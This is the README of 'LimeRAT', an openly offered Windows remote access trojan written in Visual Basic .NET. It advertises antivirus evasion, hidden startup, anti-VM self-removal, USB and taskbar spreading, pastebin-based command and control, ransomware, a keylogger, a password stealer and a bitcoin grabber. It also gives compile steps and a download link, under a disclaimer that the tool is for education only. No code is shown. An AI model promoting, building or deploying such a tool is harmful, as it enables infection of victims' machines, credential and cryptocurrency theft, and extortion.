<img src="https://i.imgur.com/1DYYXt4.gif">

# LimeRAT v0.1.2 [BETA] 
	
Simple yet powerful RAT which targeting Windows OS for educational purposes. This project is uncomplicated and easy to do or understand , targeting entry level developers, It should improve your knowledge and study for malware analysis and malware research.

 
## Main Features

* .NET - Coded in Visual Basic .NET, Client required framework 2.0 or 4.0 dependency, And server is 4.0
 
* Connection - Using pastebin.com as ip:port , Instead of noip.com DNS

* Encryption - The communication between server & client is encrypted with AES

* Spreading - Infecting all files and folders on USB drivers , Also spread over pinned applications on taskbar

* Bypass - Low AV detection and undetected startup
 
* Lightweight - Client size is 24 KB

* Anti Virtual Machines - Uninstall itself if the machine is virtual to avoid scanning or analyzing

* And more - ransomware, screen locker, passwords recovery, remote desktop, bitcoin grabber, downloader, keylogger
 


## Prerequisites

To open project you need:

1. Visual Studio 2017
2. This repository
 
 
## Testing

1. Open "LimeRAT.sln" 
2. Set Compiler to "Debug" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Press Run button. be aware that both client and server are localhost


## Compiling
 
1. Open "LimeRAT.sln" 
2. Set Compiler to "Release" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Everything will be under "\Project\_EXE\Release"
5. Convert stub.exe to stub.il, using [Ildasm](https://pastebin.com/raw/rGCQC1zq)

## Download SRC and compiled version

https://github.com/NYAN-x-CAT/Lime-RAT/releases


 ```
 This project was only tested on local-lab[LAN]. I did not test it on external-lab[WAN].
 Server tested on Windows 10, Client tested on virtual machine windows 7.
 ```
 
 
 ## Issues
 
1. While using ransomware, restore point won't be deleted unless you are running elevated privilege

 ``` Found an issue? report it here https://github.com/NYAN-x-CAT/Lime-RAT/issues/new  ```

## Author

* **NYAN CAT**  


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.


## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details
